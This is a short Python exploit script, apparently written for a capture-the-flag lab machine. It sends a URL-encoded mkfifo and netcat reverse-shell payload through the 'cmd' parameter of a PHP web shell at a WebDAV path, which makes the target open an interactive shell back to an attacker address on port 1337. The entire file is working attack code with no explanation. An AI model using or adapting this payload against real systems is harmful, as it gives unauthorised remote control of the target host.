import requests

ip = "10.10.14.9"

port = "1337"

payload="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20"+ip+"%20"+port+"%20%3E%2Ftmp%2Ff%0A"

url = "http://10.10.10.67/webdav_test_inception/simple_shell.php?cmd="

exploit = url+payload

r = requests.get(exploit)

print(r.text)
